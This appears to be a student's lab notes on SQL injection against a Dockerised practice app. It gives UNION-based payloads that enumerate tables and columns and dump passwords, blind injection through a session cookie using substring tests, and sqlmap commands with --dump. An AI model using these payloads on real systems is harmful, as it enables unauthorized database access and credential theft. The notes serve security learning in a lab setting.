	
* some docker commands to setup the lab:
```
#start and run an entire app(docker-compose.yml should be present) 
sudo docker-compose up 

#run the containers in the background
sudo docker-compose up -d

#view what container are currently running
sudo docker ps -a

#stop the containers
sudo docker-compose stop

#remove a container 
sudo docker rm Container_ID

```

* ***SQL injection - UNION***
```
#this what a normal query would look like
select age from users where username = "jeremy";

#to test if we have injection we can start with characters that might trigger an error like " or '  

# the "#" or "-- -" will end the sql statement
' or 1=1#(we can also use ' or 1=1#)
#this query would return a bunch of results

#when union select we can only select the same number of columns in the query
' union select null,null,...# (until it return an output)

#in this example 
' union select null,null,null#
' union select null,null,version()# "this would return the version"

#this would return all the table names 
' union select null,null,table_name from information_schema.tables# 

#this would return all the column names
' union select null,null,column_name from information_schema.columns#

#this would return all the passwords
' union select null,null,password from injection0x01#
```

* ***SQL INJECTION - Blind***

* blind sql injection do not give us data from the database, it just gives a change of behaviour so we have to create payloads that produce true false outputs
* based on behaviour we can slowly extract data 
```
#if we don't know which parameter can be injectable use
sqlmap -r req.txt (req.txt contains the request from burpsuite)

#if it doesn't detect any injectable parameter try any other parameter in our case the application is using session cookies in some way to login 
Cookie: session=6967cabefd763ac1a1a88e11159957db' or 1=1# 
#and we login so the cookie parameter is injectable
```

```
#we use substr of the sql to validate informations from the database 

Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select version()), 1, 1)='8'#


#we send the request to the intruder in order to automate the process this is our payload 

Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select password from injection0x02 where username='jessamy'), &1&, 1)='&r&'#

#we can also do this with sqlmap : 
#save the request as req.txt
sqlmap -r req.txt --level=2 --dump
```
